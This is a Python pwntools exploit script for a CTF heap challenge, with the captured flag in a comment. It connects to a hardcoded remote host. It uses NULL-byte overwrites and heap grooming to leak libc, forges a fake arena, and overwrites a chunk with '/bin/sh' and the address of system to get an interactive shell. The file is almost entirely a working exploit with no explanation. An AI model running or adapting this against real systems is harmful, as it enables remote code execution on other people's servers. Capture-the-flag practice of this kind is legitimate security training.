#!/usr/bin/env python
# encoding: utf-8

#flag{it_is_time_to_say_goodbye_to_NULL_byte}

from pwn import remote, process, ELF
from pwn import context
from pwn import p32,p64,u32,u64

context(arch='amd64', os='linux', log_level='info')
r = None

def alloc(size):
    r.sendline('1')
    r.recvuntil('Size: ')
    assert(0 < size <= 0x58)
    r.sendline('%d' % size)
    r.recvuntil('Command: ')

def update(idx, content):
    r.sendline('2')
    r.recvuntil('Index: ')
    r.sendline('%d' % idx)
    r.recvuntil('Size: ')
    r.sendline('%d' % len(content))
    r.recvuntil('Content: ')
    r.send(content)
    r.recvuntil('Command: ')

def free(idx):
    r.sendline('3')
    r.recvuntil('Index: ')
    r.sendline('%d' % idx)
    r.recvuntil('Command: ')

def view(idx):
    r.sendline('4')
    r.recvuntil('Index: ')
    r.sendline('%d' % idx)
    m = r.recvuntil('Command: ')
    pos1 = m.find(']: ') + len(']: ')
    pos2 = m.find('\n1. ')
    return m[pos1:pos2]

def exploit(host):
    global r
    port = 10001
    r = remote(host, port)

    r.recvuntil('Command: ')

    for i in xrange(0,5):
        for j in xrange(7):
            l = 0x18 + i*0x10
            alloc(l)
            if i >= 2:
                update(0, 'h'*l)
            free(0)

    alloc(0x18) # 0
    alloc(0x58) # 1
    alloc(0x58) # 2
    alloc(0x58) # 3
    alloc(0x48) # 4

    update(4, 'h'*0x48)

    for i in xrange(5):
        alloc(0x38)
        update(5+i, 'h'*0x38)

    free(0)
    free(1)
    free(2)
    free(3)

    alloc(0x28) # 0, malloc_consolidate
    update(0, 't'*0x28)

    alloc(0x38) # 1
    alloc(0x58) # 2
    alloc(0x58) # 3

    free(1)
    free(4)

    alloc(0x58) # 1, malloc_consolidate
    leak = view(2)
    unsorted_bin = u64(leak[0x20:0x28])
    main_arena = unsorted_bin - 0x60
    libc_base = main_arena - 0x1e4c40
    print 'libc_base: %x' % libc_base
    malloc_hook = libc_base + 0x1e4c30
    libc_system = libc_base + 0x50300

    alloc(0x48) # 4
    free(4)

    update(2, 't'*0x18 + p64(0x51) + p64(0x60))

    alloc(0x48) # 4
    update(4, '\0'*0x38 + p64(0x11))

    update(1, '\0'*0x38+p64(0x61))
    free(2)
    update(1, '\0'*0x38+p64(0x61)+p64(main_arena+0x20))
    alloc(0x58) # 2

    alloc(0x58) # 10

    fake_top = libc_base + 0x1e5d90
    fake_arena = '\0'*0x30 + p64(fake_top) + p64(0)
    fake_arena += p64(main_arena+0x60)*2 + p64(main_arena+0x70)[:7]
    update(10, fake_arena)

    alloc(0x58) # 11

    for i in xrange(15):
        alloc(0x58) # 12
        free(11)
        update(10, p64(0))

        alloc(0x58) # 11
        free(12)
        update(10, p64(0))

    update(11, '/bin/sh\0' + p64(libc_system))
    r.sendline('3')
    r.recvuntil('Index: ')
    r.sendline('%d' % 11)

if __name__ == '__main__':
    host = '111.186.63.20'
    exploit(host)
    r.interactive()